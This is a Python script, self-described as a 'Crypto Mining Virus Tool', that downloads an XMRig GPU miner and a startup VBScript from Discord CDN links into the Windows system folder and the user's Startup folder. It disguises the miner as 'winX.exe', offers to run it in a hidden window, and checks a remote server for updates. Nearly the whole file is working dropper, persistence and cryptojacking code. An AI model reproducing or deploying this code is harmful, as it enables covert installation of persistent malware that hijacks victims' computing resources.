# Importing modules...
import os
import subprocess
import psutil
import time
import colorama
import requests
import zipfile
from subprocess import Popen, CREATE_NEW_CONSOLE
from urllib.request import Request, urlopen

# Get windows username
username = os.getlogin()

os.system("title www.Temal.cf - Temal#5222 Crypto Mining Virus Tool") # Change console title

# Define download function to download files
def download(url: str, dest_folder: str): # Takes url and destination folder as arguments
    if not os.path.exists(dest_folder): # Check if folder exists
        os.makedirs(dest_folder)  # create folder if it does not exist

    filename = url.split('/')[-1].replace(" ", "_")  # Get filename from url
    file_path = os.path.join(dest_folder, filename) # Define file path

    r = requests.get(url, stream=True) # Download file
    if r.ok: # Check if download was successful
        with open(file_path, 'wb') as f: # Open file
            for chunk in r.iter_content(chunk_size=1024 * 8):
                if chunk: # Check if chunk is not empty
                    f.write(chunk) # Write chunk to file
                    f.flush() # Flush file
                    os.fsync(f.fileno())
    else:  # HTTP status code 4XX/5XX
        print("Error: " + str(r.status_code)) # Print error code if download failed

# Define main function
def startup_main(self):
    os.system("cls") # Clear console
    print('─' * 36) # Print 36 dashes
    print("Temal.cf GPU Mining System, V - 1.0") # Print title
    print("Copyright (C) 2022 Temal#5222") # Print copyright
    print('─' * 36) # Print 36 dashes
    # Show options:
    print("\n1. Check Miner Installation\n2. Check Miner Status\n---------------------------------\n3. Install Virus\n4. Run Virus\n5. Terminate Virus\n6. Uninstall Virus\n7. Check for virus updates\n8. Exit")
    startup_main_input = input("\nEnter number: ") # Get user input
    print('─' * 20) # Print 20 dashes
    # If user input is 1, following statement will be executed:
    if startup_main_input == "1": # Check Miner Installation
        def check_is_installed(filepath): # Checks if file is existing and returns boolean value
            if os.path.isfile(filepath):
                print(os.path.basename(filepath) + " - " + colorama.Fore.GREEN + "OK" + colorama.Style.RESET_ALL)
                return True
            else:
                print(os.path.basename(filepath) + " - " + colorama.Fore.LIGHTRED_EX + "MISSING" + colorama.Style.RESET_ALL)
                return False
        # Call function and check if miner is installed
        check_is_installed("C:\\Windows\\winX.exe")
        check_is_installed("C:\\Windows\\xmrig-cuda.dll")
        check_is_installed("C:\\Windows\\nvrtc64_102_0.dll")
        check_is_installed("C:\\Windows\\WinRing0x64.sys")
        check_is_installed("C:\\Windows\\run.bat")
        check_is_installed("C:\\Windows\\run_shown.bat")
        check_is_installed(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs")
        check_is_installed("C:\\Windows\\nvrtc-builtins64_102.dll") # I
    # If user input is 2, following statement will be executed:
    elif startup_main_input == "2": # Check Miner Status
        def check_is_running(processName): # Checks if process is running and returns boolean value
            for proc in psutil.process_iter():
                try:
                    if processName.lower() in proc.name().lower():
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            return False
    # Call function and check if miner is running
        if check_is_running("winX.exe") == True:
            print("Miner is " + colorama.Fore.GREEN + "running" + colorama.Style.RESET_ALL) # Print miner is running if true
        elif check_is_running("winX.exe") == False:
            print("Miner is " + colorama.Fore.RED + "not running" + colorama.Style.RESET_ALL) # Print miner is not running if false
        else:
            print(colorama.Fore.LIGHTRED_EX + "Could not identify if miner is running" + colorama.Style.RESET_ALL) # Print error if there was an issue
    # If user input is 3, following statement will be executed:
    elif startup_main_input == "3": # Install Virus
        # Check if virus is already installed
        def check_is_installed(filepath):
            if os.path.isfile(filepath):
                return True
            else:
                return False

        if check_is_installed("C:\\Windows\\winX.exe") == True and check_is_installed(
                "C:\\Windows\\xmrig-cuda.dll") == True and check_is_installed(
            "C:\\Windows\\nvrtc64_102_0.dll") == True and check_is_installed(
            "C:\\Windows\\WinRing0x64.sys") == True and check_is_installed(
            "C:\\Windows\\run.bat") == True and check_is_installed(
            f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs") == True:
            print("Virus is already installed.")
        else: # If virus is not already installed, install it
            print("Trying to downloading and installing virus...")
            try:
                download("https://cdn.discordapp.com/attachments/799772068278566913/934165026703569016/file.zip", dest_folder="C:\\Windows")
                download("https://cdn.discordapp.com/attachments/933818629554847826/933839613783572480/startup.vbs", dest_folder=f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            except:
                print("Could not download files from the network.") # Print error if there was an issue downloading files from the network
            else: # If there was no issue downloading files from the network, install files
                print("Files downloaded\nInstalling now...") # Print that files were downloaded and are now installing
                try: # Try to unzip files
                    with zipfile.ZipFile("C:\\Windows\\file.zip", 'r') as zip_ref:
                        zip_ref.extractall("C:\\Windows") # Extract files
                except:
                    print("Could not extract files from zip file.") # Print error if there was an issue extracting files from zip file
                if os.path.exists("C:\\Windows\\file.zip"): # Checks if file.zip exists
                    os.remove("C:\\Windows\\file.zip") # If yes, delete file.zip
                else:
                    print("Fatal Error, zip file is missing.") # Print error if file.zip is missing
                print(colorama.Fore.GREEN + "Virus installed successfully." + colorama.Style.RESET_ALL) # Print that virus was installed successfully
    # If user input is 4, following statement will be executed:
    elif startup_main_input == "4": # Run Virus
        def check_is_installed(filepath):
            if os.path.isfile(filepath):
                return True
            else:
                return False
        # Check if virus is installed before running it to prevent errors from occurring when virus is not installed yet and user tries to run it
        if check_is_installed("C:\\Windows\\winX.exe") == True and check_is_installed(
                "C:\\Windows\\xmrig-cuda.dll") == True and check_is_installed(
            "C:\\Windows\\nvrtc64_102_0.dll") == True and check_is_installed(
            "C:\\Windows\\WinRing0x64.sys") == True and check_is_installed(
            "C:\\Windows\\run.bat") == True and check_is_installed(
            f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs") == True:
            def check_is_running(processName):
                for proc in psutil.process_iter():
                    try:
                        if processName.lower() in proc.name().lower():
                            return True
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
                return False;

            if check_is_running("winX.exe") == True: # Checks if virus is already running before running it again
                print("Virus is already running!")
                confirm = input(
                    "Do you still want to open it for a second time?\n(This is really not recommmend because your pc will be super slow)\n(Y/N): ") # Asks user if they want to run virus again
                if confirm == "Y" or confirm == "y" or confirm == "yes" or confirm == "Yes" or confirm == "YES":
                    ask_for_ui = input(
                        "\nDo you want to run the virus in the background with hidden window? (y/n): ") # Asks user if they want to run virus in background with hidden window or not
                    if ask_for_ui == "y" or ask_for_ui == "Y" or ask_for_ui == "yes" or ask_for_ui == "Yes": # If user input is yes, following statement will be executed
                        try:
                            subprocess.Popen("C:\\Windows\\run.bat") # Run virus in background with hidden window
                        except:
                            print("Fatal error, could not run virus.") # Print error if there was an issue running virus in background with hidden window
                        else:
                            print(colorama.Fore.GREEN + "Virus is now running in the background, check your task-manager!" + colorama.Style.RESET_ALL) # Print that virus is now running in background
                    elif ask_for_ui == "n" or ask_for_ui == "N" or ask_for_ui == "no" or ask_for_ui == "No": # If user input is no, following statement will be executed
                        ask_for_samewindow = input("\nDo you want to run the virus in this console or in a new one? (this/new): ") # Asks user if they want to run virus in this console or in a new one
                        if ask_for_samewindow == "this" or ask_for_samewindow == "This" or ask_for_samewindow == "THIS": # If user input is "this", following statement will be executed
                            try:
                                os.system("cls") # Clear console
                                subprocess.Popen("C:\\Windows\\run_shown.bat") # Run virus shown in this console
                            except:
                                print("Fatal error, could not run virus.") # Print error if there was an issue running virus in this console
                            else:
                                print(colorama.Fore.GREEN + "Virus is now running!" + colorama.Style.RESET_ALL) # Print that virus is now running
                                print('─' * 36)
                        elif ask_for_samewindow == "new" or ask_for_samewindow == "New" or ask_for_samewindow == "NEW": # If user input is "new", following statement will be executed
                            try:
                                Popen('C:\\Windows\\run_shown.bat', creationflags=CREATE_NEW_CONSOLE) # Run virus shown in a new console
                            except:
                                print("Fatal error, could not run virus.") # Print error if there was an issue running virus in a new console
                            else:print(colorama.Fore.GREEN + "Virus is now running in a new window!" + colorama.Style.RESET_ALL) # Print that virus is now running in a new window
                elif confirm == "N" or confirm == "n" or confirm == "no" or confirm == "No" or confirm == "NO": # If user input is no, following statement will be executed
                    pass # Do nothing and just return to main menu again
                else: # If no valid user input was given, following statement will be executed
                    print("Invalid input, please try again.")
            else:
                ask_for_ui = input("\nDo you want to run the virus hidden or in the foreground? (H/F): ") # Asks user if they want to run virus in background with hidden window or not
                if ask_for_ui == "h" or ask_for_ui == "H" or ask_for_ui == "hidden" or ask_for_ui == "Hidden" or ask_for_ui == "HIDDEN": # If user input is hidden, following statement will be executed
                    try:
                        subprocess.Popen("C:\\Windows\\run.bat") # Run virus in background with hidden window
                    except:
                        print("Fatal error, could not run virus.") # Print error if there was an issue running virus in background with hidden window
                    else:
                        print(colorama.Fore.GREEN + "Virus is now running in the background, check your task-manager!" + colorama.Style.RESET_ALL) # Print that virus is now running in background
                elif ask_for_ui == "f" or ask_for_ui == "F" or ask_for_ui == "foreground" or ask_for_ui == "Foreground" or ask_for_ui == "FOREGROUND": # If user input is foreground, following statement will be executed
                    ask_for_samewindow = input("\nDo you want to run the virus in this console or in a new one? (this/new): ") # Asks user if they want to run virus in this console or in a new one
                    if ask_for_samewindow == "this" or ask_for_samewindow == "This" or ask_for_samewindow == "THIS": # If user input is "this", following statement will be executed
                        try: # Try to run virus in this console
                            os.system("cls") # Clear console
                            subprocess.Popen("C:\\Windows\\run_shown.bat") # Run virus shown in this console
                        except:
                            print("Fatal error, could not run virus.") # Print error if there was an issue running virus in this console
                        else:
                            print(colorama.Fore.GREEN + "Virus is now running!" + colorama.Style.RESET_ALL) # Print that virus is now running
                            print('─' * 36) # Print a separator line for better readability of the console output (just a bunch of dashes)
                    elif ask_for_samewindow == "new" or ask_for_samewindow == "New" or ask_for_samewindow == "NEW": # If user input is "new", following statement will be executed
                        try:
                            Popen('C:\\Windows\\run_shown.bat', creationflags=CREATE_NEW_CONSOLE) # Run virus shown in a new console
                        except:
                            print("Fatal error, could not run virus.") # Print error if there was an issue running virus in a new console
                        else:
                            print(colorama.Fore.GREEN + "Virus is now running in a new window!" + colorama.Style.RESET_ALL) # Print that virus is now running in a new window
        else: # If the user trys to run the virus but it is not even installed, following statement will be executed
            print("Error, virus is not installed.")
    # If user input is 5, following statement will be executed:
    elif startup_main_input == "5": # Terminate Virus
        def check_is_running(processName): # Function to check if virus is running
            for proc in psutil.process_iter():
                try:
                    if processName.lower() in proc.name().lower():
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            return False

        if check_is_running("winX.exe") == True: # If virus is running, following statement will be executed
            os.system("taskkill /F /T /IM winX.exe") # Terminate virus
            print("Virus has been stopped, you need to close the console manually.") # Print that virus has been stopped
        elif check_is_running("winX.exe") == False: # If virus is not running, following statement will be executed
            print("Virus is not even running.") # Print that virus is not running
    # If user input is 6, following statement will be executed:
    elif startup_main_input == "6": # Uninstall Virus
        def check_is_running(processName): # Function to check if virus is running before uninstalling it
            for proc in psutil.process_iter():
                try:
                    if processName.lower() in proc.name().lower():
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            return False

        if check_is_running("winX.exe") == True: # If virus is running, following statement will be executed
            os.system("taskkill /F /T /IM winX.exe") # Terminate virus
        def mass_delete(filepath): # Function to delete all virus files
            try:
                os.remove(filepath)
                print(os.path.basename(filepath) + " - " + colorama.Fore.LIGHTRED_EX + "REMOVED" + colorama.Style.RESET_ALL)
            except Exception as e:
                print(os.path.basename(filepath) + " - " + colorama.Fore.RED + "FAILED" + colorama.Style.RESET_ALL)
        print("Please wait...") # Print that the user needs to wait
        time.sleep(3) # Wait 3 seconds before executing the following statements (this is strongly recommended to avoid errors)

        # Checks for every virus file and deletes them:

        if os.path.isfile("C:\\Windows\\winX.exe"):
            time.sleep(0.1)
            mass_delete("C:\\Windows\\winX.exe")
        else:
            print("Info: winX.exe not found.")
        if os.path.isfile("C:\\Windows\\xmrig-cuda.dll"):
            time.sleep(0.1)
            mass_delete("C:\\Windows\\xmrig-cuda.dll")
        else:
            print("Info: xmrig-cuda.dll not found.")
        if os.path.isfile("C:\\Windows\\nvrtc64_102_0.dll"):
            time.sleep(0.1)
            mass_delete(f"C:\\Windows\\nvrtc64_102_0.dll")
        else:
            print("Info: nvrtc64_102_0.dll not found.")
        if os.path.isfile("C:\\Windows\\WinRing0x64.sys"):
            time.sleep(0.1)
            mass_delete(f"C:\\Windows\\WinRing0x64.sys")
        else:
            print("Info: WinRing0x64.sys not found.")
        if os.path.isfile("C:\\Windows\\run.bat"):
            time.sleep(0.1)
            mass_delete(f"C:\\Windows\\run.bat")
        else:
            print("Info: run.bat not found.")
        if os.path.isfile("C:\\Windows\\run_shown.bat"):
            time.sleep(0.1)
            mass_delete(f"C:\\Windows\\run_shown.bat")
        else:
            print("Info: run_shown.bat not found.")
        if os.path.isfile(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs"):
            time.sleep(0.1)
            mass_delete(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs")
        else:
            print("Info: startup.vbs not found.")
        if os.path.isfile(f"C:\\Windows\\file_1.zip"):
            time.sleep(0.1)
            mass_delete(f"C:\\Windows\\file_1.zip")
        if os.path.isfile(f"C:\\Windows\\file.zip"):
            time.sleep(0.1)
            mass_delete(f"C:\\Windows\\file.zip")
        if os.path.isfile(f"C:\\Windows\\nvrtc-builtins64_102.dll"):
            time.sleep(0.1)
            mass_delete("C:\\Windows\\nvrtc-builtins64_102.dll")
        else:
            print("Info: nvrtc-builtins64_102.dll not found.")
    # If user input is 7, following statement will be executed:
    elif startup_main_input == "7": # Check for updates
        current_version = "b'1.0'" # Saves current version of the virus in a variable (do not change this)
        try:
            req = Request('https://temal.cf/miner/version.json', headers={'User-Agent': 'PyMiner32'}) # Connects to the website
            webpage = urlopen(req).read() # Reads the webpage and saves it in a variable
            if current_version == str(webpage): # If the current version is the same as the one on the website, following statement will be executed
                print("You are using the latest version.") # Print that the user is using the latest version
            else: # If the current version is not the same as the one on the website, following statement will be executed
                print("There is a new version available.") # Print that there is a new version available
                print("Contact Temal#5222 on Discord for more information.") # Print that the user needs to contact Temal#5222 on Discord for more information
        except:
            print("Could not check for updates.") # If the user is unable to check for updates, following statement will be executed
    # If user input is 8, following statement will be executed:
    elif startup_main_input == "8":
        print("Exiting...")
        time.sleep(1) # Wait for 1 second before exiting
        exit(1) # Exit the program
    else: # If user input is not 1, 2, 3, 4, 5, 6, 7 or 8, following statement will be executed:
        print("Invalid input.")
# Create loop
while True:
    startup_main(True) # Call main function with True argument
    input("\nPress enter to continue...") # Wait for user input before continuing to the next loop iteration (infinite loop)